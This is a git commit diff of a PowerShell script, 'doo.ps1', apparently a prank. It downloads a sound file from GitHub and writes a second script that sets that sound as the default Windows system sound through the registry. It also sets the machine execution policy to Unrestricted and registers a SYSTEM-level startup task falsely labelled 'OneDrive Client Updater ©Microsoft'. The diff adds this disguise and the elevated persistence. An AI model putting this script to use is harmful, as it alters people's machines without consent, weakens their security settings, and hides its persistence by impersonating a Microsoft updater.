c3ef0f5e0649f5ebcf54aca59842293e144a0260
Ethan Bayliss <8937797+ethanbayliss@users.noreply.github.com>
2022-05-18 18:41:24 +0800

    Update doo.ps1

--- doo.ps1
+++ doo.ps1
@@ -1,17 +1,19 @@
 New-Item -ItemType Directory -Force -Path C:\temp
-Invoke-WebRequest -Uri "https://github.com/ethanbayliss/rads/raw/main/doo.wav" -OutFile "C:\temp\doo.wav"
 
-(New-Object -ComObject WScript.Shell).RegWrite("HKCU\AppEvents\Schemes\Apps\.Default\.Default\.Current\","c:\temp\doo.wav","REG_SZ")
-
-Remove-Item -Path C:\temp\netskope-updater.ps1
-Add-Content -Path C:\temp\netskope-updater.ps1 -Value @"
-New-Item -ItemType Directory -Force -Path C:\temp
+Remove-Item -Path C:\temp\onedrive-updater.ps1
+Add-Content -Path C:\temp\onedrive-updater.ps1 -Value @"
 Invoke-WebRequest -Uri "https://github.com/ethanbayliss/rads/raw/main/doo.wav" -OutFile "C:\temp\doo.wav"
 
 (New-Object -ComObject WScript.Shell).RegWrite("HKCU\AppEvents\Schemes\Apps\.Default\.Default\.Current\","c:\temp\doo.wav","REG_SZ")
 "@
 
 Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Scope LocalMachine -Force
-$trigger = New-JobTrigger -AtStartup -RandomDelay 00:00:30
-Unregister-ScheduledJob -Name onedrive-updater
-Register-ScheduledJob -Trigger $trigger -FilePath C:\temp\onedrive-updater.ps1 -Name onedrive-updater
+
+$trigger = New-JobTrigger -AtStartup -RandomDelay 00:30:00
+$action = New-ScheduledTaskAction -Execute 'powershell.exe' -Argument '-File "C:\temp\onedrive-updater.ps1"'
+$principal = New-ScheduledTaskPrincipal -UserId SYSTEM -LogonType ServiceAccount -RunLevel Highest
+
+$definition = New-ScheduledTask -Action $action -Principal $principal -Trigger $trigger -Description "OneDrive Client Updater ©Microsoft"
+
+Unregister-ScheduledTask -Name "onedrive-client-updater"
+Register-ScheduledTask -TaskName "onedrive-client-updater" -InputObject $definition
